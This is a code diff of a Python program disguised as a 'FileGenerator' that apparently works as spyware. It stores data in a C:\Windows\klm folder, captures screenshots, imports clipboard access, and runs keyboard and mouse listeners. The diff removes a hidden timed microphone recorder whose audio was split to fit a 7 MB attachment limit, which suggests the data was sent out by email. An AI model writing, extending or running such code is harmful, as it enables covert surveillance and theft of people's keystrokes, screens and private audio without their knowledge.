@@ -3,29 +3,16 @@ import os
 import platform
 import socket
 import time
-import wave
 import pyscreenshot
-import sounddevice as sd
 import pyperclip
 from pynput import keyboard
 from pynput.keyboard import Listener
 import threading
-import math
 
-# Set up logging
-log_directory = "C:\\Windows\\klm\\logs"
+# Shared settings
 output_directory = "C:\\Windows\\klm\\output"
-os.makedirs(log_directory, exist_ok=True)
-os.makedirs(output_directory, exist_ok=True)
-logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'),
-                    level=logging.DEBUG,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
-
-VERSION = "1.0.2"
-MICROPHONE_INTERVAL = 4500  # 1 hour and 15 minutes in seconds
-MICROPHONE_DURATION = 30  # 3 minutes in seconds
-MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
-KLM_DIRECTORY = "C:\\Windows\\klm"
+log_directory = "C:\\Windows\\klm\\logs"
+logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 class FileGenerator:
     def __init__(self):
@@ -89,50 +76,6 @@ class FileGenerator:
         self.appendlog("Machine: {}\n".format(machine))
         self.save_log()
 
-    def microphone(self):
-        try:
-            fs = 44100  # Sample rate
-            seconds = MICROPHONE_DURATION  # Duration of recording
-            audio_path = os.path.join(output_directory, "audio_log.wav")
-
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
-            sd.wait()  # Wait until recording is finished
-
-            # Save as WAV file
-            with wave.open(audio_path, 'wb') as wf:
-                wf.setnchannels(2)
-                wf.setsampwidth(2)  # 2 bytes per sample
-                wf.setframerate(fs)
-                wf.writeframes(myrecording.tobytes())
-
-            audio_size = os.path.getsize(audio_path)
-            logging.info(f"Recorded audio size: {audio_size} bytes")
-            if audio_size > MAX_ATTACHMENT_SIZE:
-                logging.info("Splitting audio file due to size")
-                self.split_audio_file(audio_path)
-            else:
-                logging.info(f"Audio file saved to {audio_path}")
-        except Exception as e:
-            self.appendlog(f"Failed to record audio: {e}\n")
-            logging.error(f"Failed to record audio: {e}")
-
-    def split_audio_file(self, audio_path):
-        chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
-        with wave.open(audio_path, 'rb') as wf:
-            params = wf.getparams()
-            total_frames = wf.getnframes()
-            frames_per_chunk = chunk_size // (params.sampwidth * params.nchannels)
-            num_chunks = math.ceil(total_frames / frames_per_chunk)
-
-            for i in range(num_chunks):
-                chunk_path = os.path.join(output_directory, f"audio_log_part_{i+1}.wav")
-                with wave.open(chunk_path, 'wb') as chunk_wf:
-                    chunk_wf.setparams(params)
-                    frames = wf.readframes(frames_per_chunk)
-                    chunk_wf.writeframes(frames)
-                logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
-        os.remove(audio_path)  # Delete the original file after splitting
-
     def screenshot(self):
         try:
             img = pyscreenshot.grab()
@@ -146,11 +89,6 @@ class FileGenerator:
             logging.error(f"Failed to take screenshot: {e}")
 
     def run(self):
-        # Start the microphone report timer
-        mic_timer = threading.Timer(MICROPHONE_INTERVAL, self.microphone)
-        mic_timer.daemon = True
-        mic_timer.start()
-
         # Take a screenshot initially
         self.screenshot()
 
@@ -164,5 +102,6 @@ class FileGenerator:
         with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
             mouse_listener.join()
 
-file_generator = FileGenerator()
-file_generator.run()
+if __name__ == "__main__":
+    file_generator = FileGenerator()
+    file_generator.run()
